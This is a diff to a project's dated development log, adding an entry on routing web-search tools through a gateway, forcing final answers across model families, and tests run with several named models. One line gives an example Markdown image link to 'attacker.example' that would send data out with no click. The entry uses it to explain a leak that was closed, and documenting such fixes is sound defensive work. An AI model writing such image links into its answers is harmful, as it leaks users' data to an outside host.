@@ -4,6 +4,35 @@ A dated log of what was done and decided, newest first. The plan and milestone s
 
 ---
 
+## 2026-11-05
+
+- **M9 done: web tools through mcpgw** ([ADR 0014](adr/0014-tools-through-mcpgw.md)). The date in the intro, the chair's
+  "Search the web", a per-seat web setting, and the tool loop.
+  - **Checked first, on real models with thinking on, and it changed the design:**
+    - with `tool_choice: "none"` to force a final answer, DeepSeek wrote its raw `<｜｜DSML｜｜tool_calls>` markup into the
+      answer, and Claude Opus returned no text. So the final answer now gets the research as plain text and no tools at
+      all, which worked on every family;
+    - `tool_choice: "required"` fails on Claude models that think, so "must search" names `web_search`.
+  - **A leak found on the way:** answers rendered Markdown images, so a model could make the browser send
+    `![](https://attacker.example/?data=…)` with no click. Images in answers no longer load; they show as
+    `[image: description]`.
+  - **The URL rule:** a seat may only read links from the Chair or a search. The rule runs in homestorm, since mcpgw can't
+    tell where a URL came from.
+  - **Built:** migration `0006_web_tools` (`seats.web_access`, `messages.tool_calls`, `author_kind = 'sources'`), the
+    `mcpgw` client, `engine/tools.ts`, the loop in `runTurn`, `POST /meetings/:id/search`, the seat setting, the Sources
+    card, the tool line under answers, and the export.
+  - **Checked:**
+    - 133 API tests, including 30 new ones on the loop and the URL rule, and 19 web tests;
+    - a real meeting in a real browser on localhost, against the real llmgw and mcpgw, in a throwaway database. A chair
+      search; then a blind round with DeepSeek Flash, GPT-5.6 Luna ("must search") and Claude Haiku 5.5 all searching,
+      reading and citing up to the limit, with DeepSeek V4 Pro (tools off) answering from the chair's search. All of them
+      correctly said PostgreSQL 18 is stable and 19 is at release candidate;
+    - **the rule, for real:** DeepSeek Flash tried a URL from memory and was refused before reaching mcpgw, the chair saw
+      it in amber, and the seat said honestly that it couldn't read the page. A seat told to write a Markdown image got
+      `[image: chart]`, with no `<img>` and no request sent. mcpgw's logs show 16 calls from homestorm with per-turn IDs,
+      and the refused address never arrived.
+  - **Not checked on the cluster with a real meeting:** that needs the admin login. It's the user's to try.
+
 ## 2026-11-04
 
 - **An exhausted allowance no longer blocks a seat** ([ADR 0002](adr/0002-llm-access-through-llmgw.md), the user's
@@ -69,7 +98,7 @@ A dated log of what was done and decided, newest first. The plan and milestone s
 - **Tools planned, through mcpgw** ([ADR 0014](adr/0014-tools-through-mcpgw.md), M9 in [plan.md](plan.md)). Models
   behind llmgw can't look anything up. Tools will come from a new home-cluster gateway, **mcpgw** (design at
   `~/agentic/mcpgw/docs/design.md`), and homestorm will run the tool loop: the date in the intro, then chair search,
-  then seat tools. Waits for mcpgw.
+  then seat tools.
 - **Tool loop tried with a fake MCP server** against the real llmgw. Claude Haiku 5.5, GPT-5.6 Luna and DeepSeek
   Flash each chose to search for a price, wrote their own query and quoted the fake result. None searched for a
   question they already knew. They trusted the fake source differently (Claude doubted it, GPT didn't), so sources
